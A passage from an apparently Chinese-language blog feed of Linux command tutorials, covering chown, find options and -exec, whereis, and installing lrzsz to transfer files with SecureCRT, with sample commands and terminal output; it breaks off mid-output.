    <content type="text"><![CDATA[Linux 命令- chown&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;chown将指定文件的拥有者改为指定的用户或组，用户可以是用户名或者用户ID；组可以是组名或者组ID；文件是以空格分开的要改变权限的文件列表，支持通配符。系统管理员经常使用chown命令，在将文件拷贝到另一个用户的名录下之后，让用户拥有使用该文件的权限。 1.命令格式1chown [选项] [所有者]:[组] [文件] 2.命令功能必要参数 -c 显示更改的部分的信息 -f 忽略错误信息 -h 修复符号链接 -R 处理指定目录以及其子目录下的所有文件 -v 显示详细的处理信息 -deference 作用于符号链接的指向，而不是链接文件本身 选择参数 –reference=&lt;目录或文件&gt; 把指定的目录/文件作为参考，把操作的文件/目录设置成参考文件/目录相同拥有者和群组 –from=&lt;当前用户：当前群组&gt; 只有当前用户和群组跟指定的用户和群组相同时才进行改变 –help 显示帮助信息 –version 显示版本信息 4.使用实例实例1.改变拥有者和群组&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1chown mail:mail log2012.log &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 123456789101112131415161718[root@localhost test6]# ll---xr--r-- 1 root users 302108 11-30 08:39 linklog.log---xr--r-- 1 root users 302108 11-30 08:39 log2012.log-rw-r--r-- 1 root users 61 11-30 08:39 log2013.log-rw-r--r-- 1 root users 0 11-30 08:39 log2014.log-rw-r--r-- 1 root users 0 11-30 08:39 log2015.log-rw-r--r-- 1 root users 0 11-30 08:39 log2016.log-rw-r--r-- 1 root users 0 11-30 08:39 log2017.log[root@localhost test6]# chown mail:mail log2012.log [root@localhost test6]# ll---xr--r-- 1 root users 302108 11-30 08:39 linklog.log---xr--r-- 1 mail mail 302108 11-30 08:39 log2012.log-rw-r--r-- 1 root users 61 11-30 08:39 log2013.log-rw-r--r-- 1 root users 0 11-30 08:39 log2014.log-rw-r--r-- 1 root users 0 11-30 08:39 log2015.log-rw-r--r-- 1 root users 0 11-30 08:39 log2016.log-rw-r--r-- 1 root users 0 11-30 08:39 log2017.log[root@localhost test6]# &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;将文件 log2012.log 的属主 root 和 属组 users 改变为 属主 mail 和属组 mail 实例2.改变文件拥有者和群组&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1chown root: log2012.log &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 1234567891011121314151617181920[root@localhost test6]# ll总计 604---xr--r-- 1 root users 302108 11-30 08:39 linklog.log---xr--r-- 1 mail mail 302108 11-30 08:39 log2012.log-rw-r--r-- 1 root users 61 11-30 08:39 log2013.log-rw-r--r-- 1 root users 0 11-30 08:39 log2014.log-rw-r--r-- 1 root users 0 11-30 08:39 log2015.log-rw-r--r-- 1 root users 0 11-30 08:39 log2016.log-rw-r--r-- 1 root users 0 11-30 08:39 log2017.log[root@localhost test6]# chown root: log2012.log [root@localhost test6]# ll总计 604---xr--r-- 1 root users 302108 11-30 08:39 linklog.log---xr--r-- 1 root root 302108 11-30 08:39 log2012.log-rw-r--r-- 1 root users 61 11-30 08:39 log2013.log-rw-r--r-- 1 root users 0 11-30 08:39 log2014.log-rw-r--r-- 1 root users 0 11-30 08:39 log2015.log-rw-r--r-- 1 root users 0 11-30 08:39 log2016.log-rw-r--r-- 1 root users 0 11-30 08:39 log2017.log[root@localhost test6]# &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;将文件 log2012.log 的属主和属组改变为 root 实例3.改变文件群组&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1chown :mail log2012.log &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 12345678910111213141516171819root@localhost test6]# ll总计 604---xr--r-- 1 root users 302108 11-30 08:39 linklog.log---xr--r-- 1 root root 302108 11-30 08:39 log2012.log-rw-r--r-- 1 root users 61 11-30 08:39 log2013.log-rw-r--r-- 1 root users 0 11-30 08:39 log2014.log-rw-r--r-- 1 root users 0 11-30 08:39 log2015.log-rw-r--r-- 1 root users 0 11-30 08:39 log2016.log-rw-r--r-- 1 root users 0 11-30 08:39 log2017.log[root@localhost test6]# chown :mail log2012.log [root@localhost test6]# ll总计 604---xr--r-- 1 root users 302108 11-30 08:39 linklog.log---xr--r-- 1 root mail 302108 11-30 08:39 log2012.log-rw-r--r-- 1 root users 61 11-30 08:39 log2013.log-rw-r--r-- 1 root users 0 11-30 08:39 log2014.log-rw-r--r-- 1 root users 0 11-30 08:39 log2015.log-rw-r--r-- 1 root users 0 11-30 08:39 log2016.log-rw-r--r-- 1 root users 0 11-30 08:39 log2017.log &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;只把文件 log2012.log 的属组改变为 mail 属主不变 实例4.改变指定目录以及其字目录下的所有文件的拥有者和群组&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1chown -R -v root:mail test6 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 1234567891011121314151617181920212223[root@localhost test]# lldrwxr-xr-x 2 root users 4096 11-30 08:39 test6[root@localhost test]# chown -R -v root:mail test6“test6/log2014.log” 的所有者已更改为 root:mail“test6/linklog.log” 的所有者已更改为 root:mail“test6/log2015.log” 的所有者已更改为 root:mail“test6/log2013.log” 的所有者已更改为 root:mail“test6/log2012.log” 的所有者已保留为 root:mail“test6/log2017.log” 的所有者已更改为 root:mail“test6/log2016.log” 的所有者已更改为 root:mail“test6” 的所有者已更改为 root:mail[root@localhost test]# lldrwxr-xr-x 2 root mail 4096 11-30 08:39 test6[root@localhost test]# cd test6[root@localhost test6]# ll总计 604---xr--r-- 1 root mail 302108 11-30 08:39 linklog.log---xr--r-- 1 root mail 302108 11-30 08:39 log2012.log-rw-r--r-- 1 root mail 61 11-30 08:39 log2013.log-rw-r--r-- 1 root mail 0 11-30 08:39 log2014.log-rw-r--r-- 1 root mail 0 11-30 08:39 log2015.log-rw-r--r-- 1 root mail 0 11-30 08:39 log2016.log-rw-r--r-- 1 root mail 0 11-30 08:39 log2017.log]]></content>
      <tags>
        <tag>Linux命令</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[find 命令的参数详解]]></title>
    <url>%2F2017%2F08%2F10%2FLinux%20%E5%91%BD%E4%BB%A4%2F22.%20find%20%E5%91%BD%E4%BB%A4%E7%9A%84%E5%8F%82%E6%95%B0%E8%AF%A6%E8%A7%A3%2F</url>
    <content type="text"><![CDATA[find 命令的参数详解-&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;find 一些常用参数的一些常用实例和一些具体用法和注意事项。 1.使用 name 选项&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;文件名选项是 find 命令最常用的选项，要么单独使用该选项，要么和其他选项一起使用。可以使用某种文件名模式来匹配文件，记住要用引号将文件名模式引起来。不管当前路径是什么，如果想要在自己的根目录 $HOME 中查找文件名符合 *.log 的文件，使用 ~ 作为 ‘pathname’ 参数，波浪号 ~ 呆了了 $HOME 目录。 1find ~ -name "*.log" -print &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;想要在当前目录及子目录中查找所有的 ‘*.log’ 文件，可以用： 1find . -name "*.log" -print &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;想要在当前目录及子目录中查找文件名以一个大写字母开头的文件，可以用： 1find . -name "[A-Z]*" -print &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;想要在 /etc 目录中查找文件名以 host 开头的文件，可以用： 1find /etc -name "host*" -print &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;想要查找 $HOME 目录中的文件，可以用： 1find ~ -name "*" -print &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;或 1find . -print &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;要想让系统高负荷运行，就从根目录开始查找所有的文件 1find / -name "*" -print &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;如果想在当前目录查找文件名以一个个小写字母开头，最后是4到9加上 .log 结束的文件： &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1find . -name "[a-z]*[4-9].log" -print &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 1234567891011121314[root@localhost test]# ll总计 316-rw-r--r-- 1 root root 302108 11-13 06:03 log2012.log-rw-r--r-- 1 root root 61 11-13 06:03 log2013.log-rw-r--r-- 1 root root 0 11-13 06:03 log2014.log-rw-r--r-- 1 root root 0 11-13 06:06 log2015.logdrwxr-xr-x 6 root root 4096 10-27 01:58 scfdrwxrwxr-x 2 root root 4096 11-13 06:08 test3drwxrwxr-x 2 root root 4096 11-13 05:50 test4[root@localhost test]# find . -name "[a-z]*[4-9].log" -print./log2014.log./log2015.log./test4/log2014.log[root@localhost test]# 2.用 perm 选项&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;按照文件权限模式用 -perm 选项，按文件权限模式来查找文件的话。最好使用八进制的权限表示法。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;如在当前目录下查找文件权限位为755的文件，即文件属主可以读、写、执行，其他用户可以读、执行的文件，可以用： 1234567891011[root@localhost test]# find . -perm 755 -print../scf./scf/lib./scf/service./scf/service/deploy./scf/service/deploy/product./scf/service/deploy/info./scf/doc./scf/bin[root@localhost test]# &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;还有一种表达方法：在八进制数字前面要加一个横杠 - ，表示都匹配，如 -007 就相当于 777， -005 相当于 555。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1find . -perm -005 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 12345678910111213141516171819202122[root@localhost test]# ll总计 316-rw-r--r-- 1 root root 302108 11-13 06:03 log2012.log-rw-r--r-- 1 root root 61 11-13 06:03 log2013.log-rw-r--r-- 1 root root 0 11-13 06:03 log2014.log-rw-r--r-- 1 root root 0 11-13 06:06 log2015.logdrwxr-xr-x 6 root root 4096 10-27 01:58 scfdrwxrwxr-x 2 root root 4096 11-13 06:08 test3drwxrwxr-x 2 root root 4096 11-13 05:50 test4[root@localhost test]# find . -perm -005../test4./scf./scf/lib./scf/service./scf/service/deploy./scf/service/deploy/product./scf/service/deploy/info./scf/doc./scf/bin./test3[root@localhost test]# 3.忽略某个目录&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;如果在查找文件时希望忽略某个目录，因为知道那个目录中没有索要查找的文件，那么可以使用 -prune 选项来指出需要忽略的目录。在使用 -prune 选项时要当心，因为如果同时使用了 -depth 选项，那么 -prune 选项就会被 find 命令忽略。如果希望在 test 目录下查找文件，但不希望在 test/test3 目录下查找，可以用： &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1find test -path “test/test3” -prune -o -print &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 12345678910111213141516171819[root@localhost soft]# find test -path "test/test3" -prune -o -printtesttest/log2014.logtest/log2015.logtest/test4test/test4/log2014.logtest/test4/log2013.logtest/test4/log2012.logtest/scftest/scf/libtest/scf/servicetest/scf/service/deploytest/scf/service/deploy/producttest/scf/service/deploy/infotest/scf/doctest/scf/bintest/log2013.logtest/log2012.log[root@localhost soft]# 4.使用 find 查找文件的时候怎么不开某个文件目录实例1：在 test 目录下查找不再 test4 子目录之内的所有文件&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1find test -path "test/test4" -prune -o -print &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 1234567891011121314151617181920212223242526272829303132333435[root@localhost soft]# find testtesttest/log2014.logtest/log2015.logtest/test4test/test4/log2014.logtest/test4/log2013.logtest/test4/log2012.logtest/scftest/scf/libtest/scf/servicetest/scf/service/deploytest/scf/service/deploy/producttest/scf/service/deploy/infotest/scf/doctest/scf/bintest/log2013.logtest/log2012.logtest/test3[root@localhost soft]# find test -path "test/test4" -prune -o -printtesttest/log2014.logtest/log2015.logtest/scftest/scf/libtest/scf/servicetest/scf/service/deploytest/scf/service/deploy/producttest/scf/service/deploy/infotest/scf/doctest/scf/bintest/log2013.logtest/log2012.logtest/test3[root@localhost soft]# &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明 1find [-path ..] [expression] &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在路径列表的后面的是表达式&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;-path “test” -prune -o -print 是 -path “test” -a -prune -o -print 的简写表达式按顺序求值， -a 和 -o 都是短路求值，与 shell 的 &amp;&amp; 和 || 类似。&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;如果 -path “test” 为真，则求值 -prune ，-prune 返回真，与逻辑表达式为真；否则不求值 -prune ，与逻辑表达式为假。如果 -path “test” -a -prune 为假，则求值 -print ，-print 返回真，或逻辑表达式为真；否则不求值 -print ，或逻辑表达式为真。&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;这个表达式组合特例可以用伪码写为： 12345if -path "test"then -pruneelse -print 实例2：避开多个文件夹&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1find test \( -path test/test4 -o -path test/test3 \) -prune -o -print &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 123456789101112131415[root@localhost soft]# find test \( -path test/test4 -o -path test/test3 \) -prune -o -printtesttest/log2014.logtest/log2015.logtest/scftest/scf/libtest/scf/servicetest/scf/service/deploytest/scf/service/deploy/producttest/scf/service/deploy/infotest/scf/doctest/scf/bintest/log2013.logtest/log2012.log[root@localhost soft]# &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;圆括号表示表达式的结合。 \ 表示引用，即指示 shell 不对后面的字符作特殊解释，而留给 find 命令去解释其意义。 实例3：查找某一确定文件，-name 等选项加在 -o 之后&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1find test \(-path test/test4 -o -path test/test3 \) -prune -o -name "*.log" -print &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 123456[root@localhost soft]# find test \( -path test/test4 -o -path test/test3 \) -prune -o -name "*.log" -printtest/log2014.logtest/log2015.logtest/log2013.logtest/log2012.log[root@localhost soft]# 5.使用 user 和 nouser 选项&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;按文件属主查找文件： 实例1：在 $HOME 目录中查找文件属主为 peida 的文件&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1find ~ -user peida -print 实例2：在 /etc 目录下查找文件属主为 peida 的文件&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1find /etc -user peida -print 实例3：为了查找属主账户已经被删除的文件，可以使用 -nouser 选项。在 /home 目录下查找所有的这类文件&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1find /home -nouser -print &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;这样就能够找到那些属主在 /etc/passwd 文件中没有有效账户的文件。在使用 -nouser 选项时，不必给出用户名；find 命令能够完成相应的工作。 6.使用 group 和 nogroup 选项&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;就像 user 和 nouser 选项一样，针对文件所属于的用户组，find 命令也具有同样的选项，为了在 /apps 目录下查找属于 gem 用户组的文件，可以用： 1find /apps -group gem -print &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;要查找没有有效所属用户组的所有文件，可以使用 nogroup 选项。下面的 find 命令从文件系统的根目录处查找这样的文件： 1find / -nogroup -print 7.按照更改时间或访问时间等查找文件&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;如果希望按照更改时间来查找文件，可以使用 mtime 、atime 或 ctime 选项。如果系统突然没有可用空间了，很有可能某一个文件的长度在期间增长迅速，这是就可以用 mtime 选项来查找这样的文件。&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;用减号 - 来限定更改时间在距今 n 日之内的文件，而用加好 + 来限定更改时间在距今 n 日以前的文件。&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;希望在系统根目录下查找更改时间在5日以内的文件，可以用： 1find / -mtime -5 print &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;为了在 /var/adm 目录下查找更改时间在3日以前的文件，可以用： 1find /var/adm -mtime +3 -print 8.查找比某个文件新或旧的文件&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;如果希望查找更改时间比某个文件新但比另一个文件旧的所有文件可以使用 -newer 选项。&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;它的一般形式为： 1newest_file_name ! oldest_file_name &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;其中，！ 是逻辑非符号。 实例1： 查找更改时间比文件 log2012.log 新但比文件 log2017.log 旧的文件&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1find -newer log2012.log ! -newer log2017.log &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 123456789101112131415161718[root@localhost test]# ll总计 316-rw-r--r-- 1 root root 302108 11-13 06:03 log2012.log-rw-r--r-- 1 root root 61 11-13 06:03 log2013.log-rw-r--r-- 1 root root 0 11-13 06:03 log2014.log-rw-r--r-- 1 root root 0 11-13 06:06 log2015.log-rw-r--r-- 1 root root 0 11-16 14:41 log2016.log-rw-r--r-- 1 root root 0 11-16 14:43 log2017.logdrwxr-xr-x 6 root root 4096 10-27 01:58 scfdrwxrwxr-x 2 root root 4096 11-13 06:08 test3drwxrwxr-x 2 root root 4096 11-13 05:50 test4[root@localhost test]# find -newer log2012.log ! -newer log2017.log../log2015.log./log2017.log./log2016.log./test3[root@localhost test]# 实例2：查找更改时间比 log2012.log 文件新的文件&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1find . -newer log2012.log -print &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 1234567[root@localhost test]# find -newer log2012.log../log2015.log./log2017.log./log2016.log./test3[root@localhost test]# 9.使用 type 选项实例1：在 /etc 目录下查找所有的目录&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1find /etc -type d -print 实例2：在当前目录下查找除目录意外的所有类型的文件&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1find . ! -type d -print 实例3：在 /etc 目录下查找所有 负担好链接文件&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1find /etc/-type l -print 使用 size 选项&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;可以按照文件长度来查找文件，这里所指的文件长度既可以用块（block）来计量，也可以用字节来计量。以字节计量文件长度的表达形式为N c；以块计量文件长度只用数字表示即可。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在按照文件长度查找文件时，一般使用这种以字节表示的文件长度，在查看文件系统的大小，因为这时使用块来计量更容易转换。 实例1：在当前目录下查找文件长度大于1M字节的文件&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1find . -size +1000000c -print 实例2：在/home/apache 目录下查找文件长度恰好为100字节的文件&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1find /home/apache -size 100c -print 实例3：在当前目录下查找长度超过10块的文件，（一块等于512字节）&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1find . -size +10 -print 使用 depth 选项&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在使用 find 命令时，可能希望先匹配所有的文件，再在子目录中查找。使用 depth 选项就可以使 find 命令这样做。这样做的一个原因就是，当在使用 find 命令想磁带上备份文件系统时，希望首先备份所有的 文件，其次再备份子目录中的文件。 实例1：find 命令从文件系统的根目录开始，查找一个名为 CON.FILE 的文件&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1find . -name "*.XC" -mount -print]]></content>
      <tags>
        <tag>Linux命令</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[用 SecureCRT 来上传和下载文件]]></title>
    <url>%2F2017%2F08%2F10%2FLinux%20%E5%91%BD%E4%BB%A4%2F26.%20%E7%94%A8%20SecureCRT%20%E6%9D%A5%E4%B8%8A%E4%BC%A0%E5%92%8C%E4%B8%8B%E8%BD%BD%E6%96%87%E4%BB%B6%2F</url>
    <content type="text"><![CDATA[用 SecureCRT 来上传和下载文件&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;用SSH管理linux服务器时经常需要远程与本地之间交互文件.而直接用SecureCRT自带的上传下载功能无疑是最方便的，SecureCRT下的文件传输协议有ASCII、Xmodem、Zmodem。 文件传输协议：&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;文件传输是数据交换的主要形式。在进行文件传输时，为使文件能被正确识别和传送，我们需要在两台计算机之间建立统一的传输协议。这个协议包括了文件的识别、传送的起止时间、错误的判断与纠正等内容。常见的传输协议有以下几种： &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;ASCII：这是最快的传输协议，但只能传送文本文件。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;Xmodem：这种古老的传输协议速度较慢，但由于使用了CRC错误侦测方法，传输的准确率可高达99.6%。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;Ymodem：这是Xmodem的改良版，使用了1024位区段传送，速度比Xmodem要快 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;Zmodem：Zmodem采用了串流式（streaming）传输方式，传输速度较快，而且还具有自动改变区段大小和断点续传、快速错误侦测等功能。这是目前最流行的文件传输协议。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;除以上几种外，还有Imodem、Jmodem、Bimodem、Kermit、Lynx等协议，由于没有多数厂商支持，这里就略去不讲。 SecureCRT可以使用linux下的zmodem协议来快速的传送文件,使用非常方便.具体步骤：一．在使用SecureCRT上传下载之前需要给服务器安装lrzsz：&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;1、从下面的地址下载 lrzsz-0.12.20.tar.gz 1wget http://down1.chinaunix.net/distfiles/lrzsz-0.12.20.tar.gz &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;2、查看里面的INSTALL文档了解安装参数说明和细节 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;3、解压文件 1tar zxvf lrzsz-0.12.20.tar.gz &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;4、进入目录 1cd lrzsz-0.12.20 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;5、配置安装文件 1./configure --prefix=/usr/local/lrzsz &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;6、编译 1make &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;7、安装 1make install &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;8、建立软链接 123#cd /usr/bin#ln -s /usr/local/lrzsz/bin/lrz rz#ln -s /usr/local/lrzsz/bin/lsz sz &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;9、测试 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;运行 rz 弹出SecureCRT上传窗口,用SecureCRT来上传和下载文件。 二．设置SecureCRT上传和下载的默认目录就行&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;options-&gt;session options -&gt;Terminal-&gt;Xmodem/Zmodem 下 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在右栏directory设置上传和下载的目录 三．使用Zmodem从客户端上传文件到linux服务器&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;1.在用SecureCRT登陆linux终端. &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;2.选中你要放置上传文件的路径，在目录下然后输入rz命令,SecureCRT会弹出文件选择对话框，在查找范围中找到你要上传的文件，按Add按钮。然后OK就可以把文件上传到linux上了。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;或者在Transfer-&gt;Zmodem Upoad list弹出文件选择对话框，选好文件后按Add按钮。然后OK窗口自动关闭。然后在linux下选中存放文件的目录，输入rz命令。liunx就把那个文件上传到这个目录下了。 四．使用Zmodem下载文件到客户端：1sz filename &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;zmodem接收可以自行启动.下载的文件存放在你设定的默认下载目录下. &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;rz，sz是Linux/Unix同Windows进行ZModem文件传输的命令行工具windows端需要支持ZModem的telnet/ssh客户端，SecureCRT就可以用SecureCRT登陆到Unix/Linux主机（telnet或ssh均可）O 运行命令rz，即是接收文件，SecureCRT就会弹出文件选择对话框，选好文件之后关闭对话框，文件就会上传到当前目录 O 运行命令sz file1 file2就是发文件到windows上（保存的目录是可以配置） 比ftp命令方便多了，而且服务器不用再开FTP服务了]]></content>
      <tags>
        <tag>Linux命令</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux 命令- whereis]]></title>
    <url>%2F2017%2F08%2F10%2FLinux%20%E5%91%BD%E4%BB%A4%2F17.%20Linux%20%E5%91%BD%E4%BB%A4-%20whereis%2F</url>
    <content type="text"><![CDATA[Linux 命令- whereis&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;whereis命令只能用于程序名的搜索，而且只搜索二进制文件（参数-b）、man说明文件（参数-m）和源代码文件（参数-s）。如果省略参数，则返回所有信息。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;和find相比，whereis查找的速度非常快，这是因为linux系统会将 系统内的所有文件都记录在一个数据库文件中，当使用whereis和下面即将介绍的locate时，会从数据库中查找数据，而不是像find命令那样，通 过遍历硬盘来查找，效率自然会很高。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;但是该数据库文件并不是实时更新，默认情况下时一星期更新一次，因此，我们在用whereis和locate 查找文件时，有时会找到已经被删除的数据，或者刚刚建立文件，却无法查找到，原因就是因为数据库文件没有被更新。 1.命令格式1whereis [-bmsu] [BMS 目录名 -f ] 文件名 2.命令功能&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;whereis 命令是定位可执行文件、源代码文件、帮助文件在文件系统中的位置。这些文件的属性应属于原始代码，二进制文件，或是帮助文件。whereis 程序还具有搜索源代码、指定备用搜索路径和搜索不寻常项的能力。 3.命令参数 -b 定位可执行文件。 -m 定位帮助文件。 -s 定位源代码文件。 -u 搜索默认路径下除可执行文件、源代码文件、帮助文件以外的其它文件。 -B 指定搜索可执行文件的路径。 -M 指定搜索帮助文件的路径。 -S 指定搜索源代码文件的路径。 4.使用实例实例1：将和 ** 文件相关的文件都查找出来&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1whereis svn &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 1234[root@localhost ~]# whereis tomcattomcat:[root@localhost ~]# whereis svnsvn: /usr/bin/svn /usr/local/svn /usr/share/man/man1/svn.1.gz &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;tomcat 没安装，找不出来，svn 安装找出了很多相关文件 实例2：只将二进制文件查找出来&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1whereis -b svn &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 1234567[root@localhost ~]# whereis -b svnsvn: /usr/bin/svn /usr/local/svn[root@localhost ~]# whereis -m svnsvn: /usr/share/man/man1/svn.1.gz[root@localhost ~]# whereis -s svnsvn:[root@localhost ~]# &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;whereis -m svn 查出说明文档路径，whereis -s svn 找 source 源文件。]]></content>
      <tags>
        <tag>Linux命令</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[find 命令之 exec]]></title>
    <url>%2F2017%2F08%2F10%2FLinux%20%E5%91%BD%E4%BB%A4%2F20.%20find%20%E5%91%BD%E4%BB%A4%E4%B9%8B%20exec%2F</url>
    <content type="text"><![CDATA[find 命令之 exec&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;find是我们很常用的一个Linux命令，但是我们一般查找出来的并不仅仅是看看而已，还会有进一步的操作，这个时候exec的作用就显现出来了。 exec解释：&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;-exec 参数后面跟的是command命令，它的终止是以;为结束标志的，所以这句命令后面的分号是不可缺少的，考虑到各个系统中分号会有不同的意义，所以前面加反斜杠。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;{} 花括号代表前面find查找出来的文件名。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;使用find时，只要把想要的操作写在一个文件里，就可以用exec来配合find查找，很方便的。在有些操作系统中只允许-exec选项执行诸如l s或ls -l这样的命令。大多数用户使用这一选项是为了查找旧文件并删除它们。建议在真正执行rm命令删除文件之前，最好先用ls命令看一下，确认它们是所要删除的文件。 exec选项后面跟随着所要执行的命令或脚本，然后是一对儿{ }，一个空格和一个\，最后是一个分号。为了使用exec选项，必须要同时使用print选项。如果验证一下find命令，会发现该命令只输出从当前路径起的相对路径及文件名。 使用实例实例1：ls -l 命令放在 find 命令的 -exec 选项中&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1find . -type d -exec ls -l &#123;&#125; \; &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 12345678910111213[root@localhost test]# find . -type f -exec ls -l &#123;&#125; \; -rw-r--r-- 1 root root 127 10-28 16:51 ./log2014.log-rw-r--r-- 1 root root 0 10-28 14:47 ./test4/log3-2.log-rw-r--r-- 1 root root 0 10-28 14:47 ./test4/log3-3.log-rw-r--r-- 1 root root 0 10-28 14:47 ./test4/log3-1.log-rw-r--r-- 1 root root 33 10-28 16:54 ./log2013.log-rw-r--r-- 1 root root 302108 11-03 06:19 